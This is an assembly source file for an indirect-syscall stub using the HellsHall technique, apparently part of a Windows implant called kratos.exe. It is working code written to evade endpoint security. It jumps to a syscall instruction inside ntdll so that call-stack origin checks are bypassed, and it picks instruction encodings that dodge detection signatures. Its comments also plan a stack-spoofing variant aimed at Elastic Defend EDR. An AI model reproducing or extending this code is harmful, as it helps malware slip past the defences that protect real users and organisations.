/* syscall_stub.S  --  compiled only when EVASION_SYSCALLS is defined
 *
 * Indirect syscall variant (HellsHall):
 *   wSystemCall     - SSN (DWORD), set before each call
 *   qSyscallAddress - address of a 'syscall' (0F 05) instruction inside ntdll.dll
 *   do_syscall      - sets eax=SSN, jmps to ntdll's syscall instruction
 *
 * The jmp makes the kernel see the return address as inside ntdll,
 * not inside kratos.exe, bypassing call-stack origin checks.
 * No VirtualAlloc, no VirtualProtect, no heap trampoline, no RWX.
 */

    .section .data
    .align 4
    .globl wSystemCall
wSystemCall:
    .long 0

    .align 8
    .globl qSyscallAddress
qSyscallAddress:
    .quad 0

    .align 8
    .globl qRetGadget
qRetGadget:
    .quad 0

    .section .text
    .align 16
    .globl do_syscall
    .def do_syscall; .scl 2; .type 32; .endef
do_syscall:
    /* leaq (%rcx),%r10 encodes as 4C 8D 11 - avoids canonical mov r10,rcx (4C 89 CA). */
    leaq    (%rcx), %r10
    /* xor+add avoids the mov eax,[rip+off] (8B 05) signature. */
    xorl    %eax, %eax
    addl    wSystemCall(%rip), %eax
    /*
     * No stack spoof in this stub: jmp directly to ntdll's syscall instruction.
     *
     * The caller set up shadow space + stack args at [RSP+8..RSP+56+]. After the
     * jmpq, the CPU executes `syscall` (0F 05) in ntdll. sysret returns to the
     * byte immediately after 0F 05 (= qSyscallAddress+2, which is a C3 / ret).
     * That ret pops RSP[0] (= return addr pushed by `call do_syscall`) and returns
     * cleanly to the hg_* wrapper. Stack is balanced; all args are at their ABI-
     * correct positions throughout.
     *
     * NOTE: 3-frame stack spoof (for Elastic Defend EDR) requires per-function
     * entry points because `subq $24` shifts stack arg positions. See syscall_stub_spoof.S
     * for the EDR variant once per-function stubs are implemented.
     */
    jmpq    *qSyscallAddress(%rip)
